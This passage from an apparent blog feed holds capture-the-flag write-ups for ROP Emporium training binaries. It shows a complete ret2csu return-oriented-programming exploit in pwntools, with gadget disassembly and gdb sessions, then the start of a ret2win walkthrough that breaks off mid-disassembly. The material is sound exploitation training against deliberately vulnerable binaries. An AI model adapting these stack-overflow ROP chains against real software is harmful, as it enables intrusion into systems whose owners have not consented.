  <span class="token number">400683</span>:	4c <span class="token number">89</span> f6             	mov    <span class="token register variable">rsi</span>,<span class="token register variable">r14</span>
  <span class="token number">400686</span>:	<span class="token number">44</span> <span class="token number">89</span> ef             	mov    <span class="token register variable">edi</span>,<span class="token register variable">r13d</span>
  <span class="token number">400689</span>:	<span class="token number">41</span> ff <span class="token number">14</span> dc          	call   QWORD PTR <span class="token operator">[</span><span class="token register variable">r12</span><span class="token operator">+</span><span class="token register variable">rbx</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">]</span>
  <span class="token number">40068d</span>:	<span class="token number">48</span> <span class="token number">83</span> c3 <span class="token number">01</span>          	add    <span class="token register variable">rbx</span>,<span class="token number">0x1</span>
  <span class="token number">400691</span>:	<span class="token number">48</span> <span class="token number">39</span> dd             	cmp    <span class="token register variable">rbp</span>,<span class="token register variable">rbx</span>
  <span class="token number">400694</span>:	<span class="token number">75</span> ea                	jne    <span class="token number">400680</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">0x40</span><span class="token operator">></span>
  <span class="token number">400696</span>:	<span class="token number">48</span> <span class="token number">83</span> c4 <span class="token number">08</span>          	add    <span class="token register variable">rsp</span>,<span class="token number">0x8</span>
  40069a:	5b                   	pop    <span class="token register variable">rbx</span>
  40069b:	<span class="token number">5d</span>                   	pop    <span class="token register variable">rbp</span>
  40069c:	<span class="token number">41</span> 5c                	pop    <span class="token register variable">r12</span>
  40069e:	<span class="token number">41</span> <span class="token number">5d</span>                	pop    <span class="token register variable">r13</span>
  4006a0:	<span class="token number">41</span> 5e                	pop    <span class="token register variable">r14</span>
  4006a2:	<span class="token number">41</span> 5f                	pop    <span class="token register variable">r15</span>
  4006a4:	c3                   	ret
  4006a5:	<span class="token number">90</span>                   	nop
  4006a6:	<span class="token number">66</span> 2e 0f 1f <span class="token number">84</span> <span class="token number">00</span> <span class="token number">00</span> 	<span class="token register variable">cs</span> nop WORD PTR <span class="token operator">[</span><span class="token register variable">rax</span><span class="token operator">+</span><span class="token register variable">rax</span><span class="token operator">*</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">0x0</span><span class="token operator">]</span>
  4006ad:	<span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>

00000000004006b0 <span class="token operator">&lt;</span>__libc_csu_fini<span class="token operator">></span>:
  4006b0:	f3 c3                	repz ret z<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The <strong>__libc_csu_init</strong> section contains a sequence of pop, ret instructions which makes it a good attack vector for our rop chain. The gadgets present in this section enables us to control <strong>RBX, RBP, R12, R13, R14, and R15</strong> registers. From the ret-to-csu referenced paper this makes it a perfect candidate for our first stage and second stage rop chain.</p>
<p>The first stage gadget is shown in disassembled code below. This enables us to control the registers with the values we want, which makes our second stage gadget more controllable.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">40069a:	5b                   	pop    <span class="token register variable">rbx</span>
40069b:	<span class="token number">5d</span>                   	pop    <span class="token register variable">rbp</span>
40069c:	<span class="token number">41</span> 5c                	pop    <span class="token register variable">r12</span>
40069e:	<span class="token number">41</span> <span class="token number">5d</span>                	pop    <span class="token register variable">r13</span>
4006a0:	<span class="token number">41</span> 5e                	pop    <span class="token register variable">r14</span>
4006a2:	<span class="token number">41</span> 5f                	pop    <span class="token register variable">r15</span>
4006a4:	c3                   	ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>For the second stage, we need to look for the gadgets that will enable us to control the <strong>RDI, RSI and RDX</strong> registers in that order. This is because of x86_64 calling convention, the first three arguments to a function are passed in <strong>RDI, RSI and RDX</strong> registers respectively. From the disassembly of <strong>__libc_csu_init</strong> we can get our second gadget to build our rop chain.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">mov    <span class="token register variable">rdx</span>,<span class="token register variable">r15</span>
mov    <span class="token register variable">rsi</span>,<span class="token register variable">r14</span>
mov    <span class="token register variable">edi</span>,<span class="token register variable">r13d</span>
call   QWORD PTR <span class="token operator">[</span><span class="token register variable">r12</span><span class="token operator">+</span><span class="token register variable">rbx</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the above code, we are now able to control the <strong>rdx, rsi and edi</strong> registers.The call in the second stage gadgets, calculates the destination address of our code.</p>
<p>Because we have all the gadgets we need to build our rop chain. From the authors website, the challenge is very similar to <strong>ret2win</strong> challenge.</p>
<blockquote>
<p>This challenge is very similar to “callme”, with the exception of the useful gadgets. Simply call the ret2win() function in the accompanying library with same arguments that you used to beat the “callme” challenge (ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d) for the ARM &amp; MIPS binaries, ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) for the x86_64 binary.</p>
</blockquote>
<p>From the description, we want to pass three arguments to ret2win function. The arguments will be passed to rdi, rsi and rdx respectively. Because we don&#96;t control the these registers directly, we need to set these arguments in the first rop chain that will enable us to control the rdi, rsi and rdx in the second gadget.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm"><span class="token register variable">rdi</span> <span class="token operator">&lt;</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token register variable">r13</span> <span class="token operator">&lt;</span><span class="token operator">-</span><span class="token operator">-</span>  #first args   <span class="token number">0xdeadbeefdeadbeef</span>
<span class="token register variable">rsi</span> <span class="token operator">&lt;</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token register variable">r14</span> <span class="token operator">&lt;</span><span class="token operator">-</span><span class="token operator">-</span>  #second args  <span class="token number">0xcafebabecafebabe</span>
<span class="token register variable">rdx</span> <span class="token operator">&lt;</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token register variable">r15</span> <span class="token operator">&lt;</span><span class="token operator">-</span><span class="token operator">-</span>  #third args   <span class="token number">0xd00df00dd00df00d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>From code snip above, we can control the registers values as shown in the code above. For debugging our exploit we will use python3 and gdb to ensure that there is no unexpected behavior which may cause crashes.</p>
<p>Set a breakpoint in our first address of the ropchain gadget, and run binary with the generated payload.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) break <span class="token operator">*</span><span class="token number">0x000000000040069a</span>
Breakpoint <span class="token number">1</span> at <span class="token number">0x40069a</span>
(gdb) r <span class="token operator">&lt;</span><span class="token operator">/</span>tmp<span class="token operator">/</span>payload
Starting program: <span class="token operator">/</span>home<span class="token operator">/</span>vx<span class="token operator">/</span>Downloads<span class="token operator">/</span>rop<span class="token operator">/</span>rop<span class="token operator">/</span>ret2csu<span class="token operator">/</span>ret2csu <span class="token operator">&lt;</span><span class="token operator">/</span>tmp<span class="token operator">/</span>payload

Breakpoint <span class="token number">1</span>, <span class="token number">0x000000000040069a</span> in __libc_csu_init ()
(gdb) c
Continuing.
ret2csu by ROP Emporium
x86_64
Breakpoint <span class="token number">1</span>, <span class="token number">0x000000000040069a</span> in __libc_csu_init ()
(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>When the program is run,it hits the set breakpoint. Type <strong>c</strong> command for paused process to continue the execution. When the program finishes the execution, the return address now points back to the address of our first gadget, Because of breakpoint, the execution stops. We can inspect the memory to understand the behavior of the program and values loaded in the registers.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) x<span class="token operator">/</span>10i <span class="token operator">$</span>rip
<span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x40069a</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">90</span><span class="token operator">></span>:	pop    <span class="token register variable">rbx</span>
   <span class="token number">0x40069b</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">91</span><span class="token operator">></span>:	pop    <span class="token register variable">rbp</span>
   <span class="token number">0x40069c</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">92</span><span class="token operator">></span>:	pop    <span class="token register variable">r12</span>
   <span class="token number">0x40069e</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">94</span><span class="token operator">></span>:	pop    <span class="token register variable">r13</span>
   <span class="token number">0x4006a0</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">96</span><span class="token operator">></span>:	pop    <span class="token register variable">r14</span>
   <span class="token number">0x4006a2</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">98</span><span class="token operator">></span>:	pop    <span class="token register variable">r15</span>
   <span class="token number">0x4006a4</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">100</span><span class="token operator">></span>:	ret
   <span class="token number">0x4006a5</span>:	nop
   <span class="token number">0x4006a6</span>:	nop    WORD PTR <span class="token register variable">cs</span>:<span class="token operator">[</span><span class="token register variable">rax</span><span class="token operator">+</span><span class="token register variable">rax</span><span class="token operator">*</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">0x0</span><span class="token operator">]</span>
   <span class="token number">0x4006b0</span> <span class="token operator">&lt;</span>__libc_csu_fini<span class="token operator">></span>:	repz ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Now we can Single step in the debugger and view the values stored in the registers of our gadget. The command for single stepping in gdb is <strong>si</strong>.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) i r <span class="token register variable">rbx</span> <span class="token register variable">rbp</span> <span class="token register variable">r12</span> <span class="token register variable">r13</span> <span class="token register variable">r14</span> <span class="token register variable">r15</span>
<span class="token register variable">rbx</span>            <span class="token number">0x4343434343434343</span>  <span class="token number">4846791580151137091</span>
<span class="token register variable">rbp</span>            <span class="token number">0x4242424242424242</span>  <span class="token number">0x4242424242424242</span>
<span class="token register variable">r12</span>            <span class="token number">0x4141414141414141</span>  <span class="token number">4702111234474983745</span>
<span class="token register variable">r13</span>            <span class="token number">0xdeadbeefdeadbeef</span>  <span class="token operator">-</span><span class="token number">2401053088876216593</span>
<span class="token register variable">r14</span>            <span class="token number">0xcafebabecafebabe</span>  <span class="token operator">-</span><span class="token number">3819410105351357762</span>
<span class="token register variable">r15</span>            <span class="token number">0xd00df00dd00df00d</span>  <span class="token operator">-</span><span class="token number">3454841397007486963</span>
(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From assembly code code above we are able to control all the register value in our chain using our generated payload file. The code for generating the payload is shown below.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">import pwn

pop_gadget <span class="token operator">=</span> pwn.p64(<span class="token number">0x0040069a</span>)
payload <span class="token operator">=</span>b<span class="token string">"A"</span><span class="token operator">*</span><span class="token number">32</span> #fill the buffer
payload <span class="token operator">+</span><span class="token operator">=</span>b<span class="token string">"B"</span><span class="token operator">*</span><span class="token number">8</span> #<span class="token register variable">rbp</span>(saved)
payload <span class="token operator">+</span><span class="token operator">=</span> pop_gadget  #retaddr
payload <span class="token operator">+</span><span class="token operator">=</span> pwn.p64(<span class="token number">0x4343434343434343</span>)#<span class="token register variable">rbx</span>
payload <span class="token operator">+</span><span class="token operator">=</span> pwn.p64(<span class="token number">0x4242424242424242</span>)#<span class="token register variable">rbp</span>
payload <span class="token operator">+</span><span class="token operator">=</span> pwn.p64(<span class="token number">0x4141414141414141</span>) #<span class="token register variable">r12</span>
payload <span class="token operator">+</span><span class="token operator">=</span> pwn.p64(<span class="token number">0xdeadbeefdeadbeef</span>) #<span class="token register variable">r13</span>
payload <span class="token operator">+</span><span class="token operator">=</span> pwn.p64(<span class="token number">0xcafebabecafebabe</span>) #<span class="token register variable">r14</span>
payload <span class="token operator">+</span><span class="token operator">=</span> pwn.p64(<span class="token number">0xd00df00dd00df00d</span>) #<span class="token register variable">r15</span>
open(<span class="token string">'payload'</span>, <span class="token string">'wb'</span>).write(payload)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Next step is determining the correct or desired values for <strong>rbx, rbp and r12</strong> registers because 0x41…, 0x42…., 0x43… are not valid memory addresses.For execution of second rop gadget chain, we need to set right values of <code>rbp</code> and <code>rbx</code> due to a loop conditional.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm"><span class="token number">0x0000000000400680</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span>:	mov    <span class="token register variable">rdx</span>,<span class="token register variable">r15</span>
<span class="token number">0x0000000000400683</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">67</span><span class="token operator">></span>:	mov    <span class="token register variable">rsi</span>,<span class="token register variable">r14</span>
<span class="token number">0x0000000000400686</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">70</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token register variable">r13d</span>
<span class="token number">0x0000000000400689</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">73</span><span class="token operator">></span>:	call   QWORD PTR <span class="token operator">[</span><span class="token register variable">r12</span><span class="token operator">+</span><span class="token register variable">rbx</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">]</span>
<span class="token number">0x000000000040068d</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">77</span><span class="token operator">></span>:	add    <span class="token register variable">rbx</span>,<span class="token number">0x1</span>
<span class="token number">0x0000000000400691</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">81</span><span class="token operator">></span>:	cmp    <span class="token register variable">rbp</span>,<span class="token register variable">rbx</span>
<span class="token number">0x0000000000400694</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">84</span><span class="token operator">></span>:	jne    <span class="token number">0x400680</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span>
<span class="token number">0x0000000000400696</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">86</span><span class="token operator">></span>:	add    <span class="token register variable">rsp</span>,<span class="token number">0x8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Second gadget starts at <strong>0x0000000000400680</strong>,in which we are set values of rdi,r14 and rdx with correct argument values. Set values of <strong>rbx</strong> and <strong>rbp</strong> correctly so that conditional <strong>cmp</strong> is always true. Because of add instruction of 1 to rbx, <code>rbx</code> value needs to be 0 and <code>rbp</code> value to 1. when the registers are compared, the values are equal and Zero flag is set.</p>
<p>NB: “Adjust values in payload script and single step to confirm the validity of new values in the memory.”</p>
<p>For register <strong>r12</strong>, the address should lie in executable memory address. The <strong>.bss</strong> section is executable, therefore r12 should be set to memory address of bss section. After executing our second rop chain gadget, we need to adjust the stack as shown in the exploit code to avoid segmentation fault.</p>
<p>Lastly we need to control the <strong>rdi</strong> register with the value <strong>0xdeadbeefdeadbeef</strong>. Because we have full control of rdx and rsi register, next is to look for a <code>pop rdi, ret</code> gadget.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm"><span class="token number">0x004006a3</span>                 5f  pop <span class="token register variable">rdi</span>
<span class="token number">0x004006a4</span>                 c3  ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>Now we can pass the <strong>0xdeadbeefdeadbeef</strong> argument to the ret2win function.Now we have all the correct values of rdi, rsi and rdx correctly set, calling the ret2win function will result to us getting the correct flag.</p>
<p>The full code of the rop chain is as shown below.</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pwn

pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"latin-1"</span>
pwn<span class="token punctuation">.</span>warnings<span class="token punctuation">.</span>simplefilter<span class="token punctuation">(</span><span class="token string">"ignore"</span><span class="token punctuation">)</span>
pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
io <span class="token operator">=</span> pwn<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">'./ret2csu'</span><span class="token punctuation">)</span>

<span class="token comment">#arguments passed to ret2win function ret2win(arg1, arg2, arg3)</span>
arg1 <span class="token operator">=</span>pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeefdeadbeef</span><span class="token punctuation">)</span>
arg2 <span class="token operator">=</span>pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0xcafebabecafebabe</span><span class="token punctuation">)</span>
arg3 <span class="token operator">=</span>pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0xd00df00dd00df00d</span><span class="token punctuation">)</span>

ret2win_addr <span class="token operator">=</span>pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'ret2win'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment">#resolve address of ret2win function</span>
pop_rbx_rbp_r12_r13_r14_r15_addr <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x0040069a</span><span class="token punctuation">)</span>  <span class="token comment">#first stage gadget</span>
dereference_pointer <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00600e48</span><span class="token punctuation">)</span>  <span class="token comment">#bss area which is executable</span>
stage2_addr <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00400680</span><span class="token punctuation">)</span>  <span class="token comment">#addr of second stage rop chain</span>
pop_rdi <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x004006a3</span><span class="token punctuation">)</span>

<span class="token comment"># ropchains</span>
<span class="token comment">#stage1 ropchain</span>
<span class="token triple-quoted-string string">'''
            0x0040069a      pop   rbx
│           0x0040069b      pop   rbp
│           0x0040069c      pop   r12
│           0x0040069e      pop   r13
│           0x004006a0      pop   r14
│           0x004006a2      pop   r15
└           0x004006a4      ret
'''</span>
<span class="token comment">#Determine the loop values for conditional branch</span>
<span class="token triple-quoted-string string">'''
╎│          0x00400689      call  qword [r12 + rbx*8]
│      ╎│   0x0040068d      add   rbx, 1
│      ╎│   0x00400691      cmp   rbp, rbx
│      └──&lt; 0x00400694      jne   0x400680
'''</span>

stage1 <span class="token operator">=</span> pop_rbx_rbp_r12_r13_r14_r15_addr
stage1 <span class="token operator">+=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>   <span class="token comment">#set RBP=0</span>
stage1 <span class="token operator">+=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token comment">#set RBX=1</span>
stage1 <span class="token operator">+=</span> dereference_pointer <span class="token comment">#set R12</span>
stage1 <span class="token operator">+=</span> arg1   <span class="token comment">#R13</span>
stage1 <span class="token operator">+=</span> arg2   <span class="token comment">#R14</span>
stage1 <span class="token operator">+=</span> arg3   <span class="token comment">#R15</span>
stage1 <span class="token operator">+=</span> stage2_addr
stage1 <span class="token operator">+=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span>   <span class="token comment">#adjust the stack</span>

<span class="token comment">#stage2</span>
<span class="token triple-quoted-string string">'''
   ┌──>     0x00400680      mov   rdx, r15
│      ╎│   0x00400683      mov   rsi, r14
│      ╎│   0x00400686      mov   edi, r13d
│      ╎│   0x00400689      call  qword [r12 + rbx*8]
'''</span>

stage2 <span class="token operator">=</span> pop_rdi
stage2 <span class="token operator">+=</span>arg1
stage2 <span class="token operator">+=</span>ret2win_addr

payload <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">32</span>
payload <span class="token operator">+=</span> <span class="token string">b"B"</span><span class="token operator">*</span><span class="token number">8</span>
payload <span class="token operator">+=</span> <span class="token string">b""</span> <span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>
    stage1<span class="token punctuation">,</span>
    stage2
    <span class="token punctuation">]</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>writeafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
pwn<span class="token punctuation">.</span>info<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Running the code above we get correct flag</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:ret2csu$ python3 xpl.py
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'./ret2csu'</span><span class="token builtin class-name">:</span> pid <span class="token number">18869</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
    RUNPATH:  b<span class="token string">'.'</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>45B<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'./ret2csu'</span> stopped with <span class="token builtin class-name">exit</span> code <span class="token number">0</span> <span class="token punctuation">(</span>pid <span class="token number">18869</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  Thank you<span class="token operator">!</span>
    ROPE<span class="token punctuation">&#123;</span>a_placeholder_32byte_flag<span class="token operator">!</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>References</p>
<ol>
<li><a href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf"> Universal ROP or Return-to-csu</a></li>
<li><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">Linux program startup</a></li>
</ol>
]]></content>
      <tags>
        <tag>ropemporium</tag>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title>RopEmporium ret2win challenge</title>
    <url>/2021/12/20/ROP-ret2win/</url>
    <content><![CDATA[<blockquote>
<p>Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.This challenge is classical pwn challenge of overwriting the return address with desired address you want to return to.</p>
</blockquote>
<span id="more"></span>

<p>The binaries for the challenges can be downloaded from the author&#96;s website <a href="https://ropemporium.com/">ropemporium</a>.The goal of first challenge is to call the <strong>ret2win</strong> function.</p>
<p>After downloading the binary, the first is to check binary protection enabled on the binary using <code>checksec</code> utility.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:ret2win$ checksec --file ret2win
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Only <strong>NX</strong> (Not executable) is enabled on the binary meaning we cannot execute code stored on the stack like <code>shellcode</code>. Toe analyze the behavior of the program we will use <code>gdb</code>. gdb is a tool that enables one to inspect the behavior of binaries at runtime.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) info functions
All defined functions:

Non<span class="token operator">-</span>debugging symbols:
<span class="token number">0x0000000000400528</span>  _init
<span class="token number">0x0000000000400550</span>  puts@plt
<span class="token number">0x0000000000400560</span>  system@plt
<span class="token number">0x0000000000400570</span>  printf@plt
<span class="token number">0x0000000000400580</span>  memset@plt
<span class="token number">0x0000000000400590</span>  read@plt
<span class="token number">0x00000000004005a0</span>  setvbuf@plt
<span class="token number">0x00000000004005b0</span>  _start
<span class="token number">0x00000000004005e0</span>  _dl_relocate_static_pie
<span class="token number">0x00000000004005f0</span>  deregister_tm_clones
<span class="token number">0x0000000000400620</span>  register_tm_clones
<span class="token number">0x0000000000400660</span>  __do_<span class="token keyword">global_dtors_aux</span>
<span class="token number">0x0000000000400690</span>  frame_dummy
<span class="token number">0x0000000000400697</span>  main
<span class="token number">0x00000000004006e8</span>  pwnme
<span class="token number">0x0000000000400756</span>  ret2win
<span class="token number">0x0000000000400780</span>  __libc_csu_init
<span class="token number">0x00000000004007f0</span>  __libc_csu_fini
<span class="token number">0x00000000004007f4</span>  _fini
(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The binary has various functions has as shown in the output above.For initial analysis we start at the <code>main</code> function which is the entrypoint of our program.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(No debugging symbols found in ret2win)
(gdb) disas main
Dump of assembler code for function main:
   <span class="token number">0x0000000000400697</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span>:	push   <span class="token register variable">rbp</span>
   <span class="token number">0x0000000000400698</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
   <span class="token number">0x000000000040069b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>:	mov    <span class="token register variable">rax</span>,QWORD PTR <span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x2009b6</span><span class="token operator">]</span>        # <span class="token number">0x601058</span> <span class="token operator">&lt;</span>stdout@@GLIBC_2<span class="token number">.2</span>.<span class="token number">5</span><span class="token operator">></span>
   <span class="token number">0x00000000004006a2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span>:	mov    <span class="token register variable">ecx</span>,<span class="token number">0x0</span>
   <span class="token number">0x00000000004006a7</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x2</span>
   <span class="token number">0x00000000004006ac</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">21</span><span class="token operator">></span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
   <span class="token number">0x00000000004006b1</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">26</span><span class="token operator">></span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
   <span class="token number">0x00000000004006b4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">29</span><span class="token operator">></span>:	call   <span class="token number">0x4005a0</span> <span class="token operator">&lt;</span>setvbuf@plt<span class="token operator">></span>
   <span class="token number">0x00000000004006b9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">34</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400808</span>
   <span class="token number">0x00000000004006be</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">39</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x00000000004006c3</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">44</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400820</span>
   <span class="token number">0x00000000004006c8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">49</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x00000000004006cd</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">54</span><span class="token operator">></span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
